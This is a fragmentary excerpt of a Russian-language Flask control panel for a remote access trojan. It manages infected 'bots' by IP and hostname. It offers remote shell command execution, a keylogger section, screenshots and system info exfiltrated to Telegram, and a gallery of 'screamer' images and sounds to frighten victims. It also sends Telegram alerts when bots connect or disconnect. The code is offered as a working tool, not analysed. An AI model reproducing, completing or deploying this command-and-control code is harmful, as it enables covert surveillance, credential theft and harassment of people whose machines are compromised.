...
def send_telegram_notification(text):
    if not BOT_TOKEN or not CHAT_ID:
        print("[!] BOT_TOKEN или CHAT_ID не указаны в web_panel.py. Уведомление не отправлено.")
        return
...
<body onload="initializePanel()">
    <div class="container">
        <h1>Панель управления v21 - Финальная</h1>
        <h2>Активные боты: {{ bots_list|length }}</h2>
        {% if bots_list %}
            <div class="control-block">
                <h3>Цель</h3>
                <select id="main_bot_select" onchange="onBotSelect()"></select>
            </div>
            <div class="control-block">
                <h3>Редактор имени</h3>
                <input type="text" id="alias_input" placeholder="Введите новый псевдоним цели...">
                <button onclick="renameBot()">Переименовать</button>
            </div>
            <div class="control-block">
                <h3>Галерея скримеров</h3>
                <div class="media-gallery" id="image_gallery"></div>
            </div>
            <div class="control-block">
                <h3>Фонотека</h3>
                <div class="audio-list" id="audio_list"></div>
            </div>
            <div class="control-block">
                <h3>Выполнение команд</h3>
                <input type="text" id="command_input" placeholder="Введите команду...">
                <button onclick="sendShellCommand('command_input')">Отправить</button>
            </div>
            <div class="control-block">
                <h3>Управление звуком</h3>
                <label for="volume_slider">Громкость:</label><br>
                <input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)">
                <output id="volume_output">50%</output><br><br>
                <button onclick="sendControlCommand('mute')">Mute</button>
                <button onclick="sendControlCommand('unmute')">Unmute</button>
            </div>
            <div class="control-block">
                <h3>Кейлоггер</h3>
            ...
            <div class="control-block">
                <h3>Специальные команды</h3>
                <button onclick="sendShellCommand('sysinfo')">Получить инфо (в Telegram)</button>
                <button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button>
            </div>
            <div class="control-block">
                <h3>Результат последней команды</h3>
                <pre id="result_output_pre">Ожидание команды...</pre>
            </div>
        {% else %}
        ...
        function formatBotName(ip, data) {
            return `${ip} - ${data.hostname || "..."} ${data.alias ? ": " + data.alias : ""}`;
        }
        ...
        function initializePanel() {
            ...
            Object.entries(BOTS).forEach(([ip, data]) => {
                let opt = new Option(formatBotName(ip, data), ip);
                mainBotSelect.add(opt);
            });
        ...
        async function sendControlCommand(command) {
            sendCommand("/api/control", { command: command });
        }

        async function sendFileCommand(command_type, filename) {
            sendCommand("/api/control", { command: `${command_type} ${filename}` });
        }
        ...
        async function sendShellCommand(source) {
            ...
            sendCommand("/api/shell_command", { command: command })
                ...
                .then(data => {
                    resultOutput.textContent = data.status === "ok" ? data.result : `Ошибка: ${data.message}`;
                })
                .catch(error => {
                    resultOutput.textContent = `Сетевая ошибка: ${error}`;
                });
        }

        async function getCurrentVolume() {
            try {               const response = await sendCommand("/api/get_volume", {});
                if (response) {
...
def websocket_handler(ws):
    ...
    try:
        ...
        print(f"[-] Ошибка получения hostname от {bot_ip}: {e}")
        ws.close()
        return
    ...
    notification_text = f"✅ *Новый бот в сети!*\n\n*IP:* `{bot_ip}`\n*Имя:* `{hostname}`"
    ...
    try:
        ...
        disconnect_text = f"❌ *Бот отключился.*\n\n*IP:* `{dead_bot_ip}`"
        send_telegram_notification(disconnect_text)
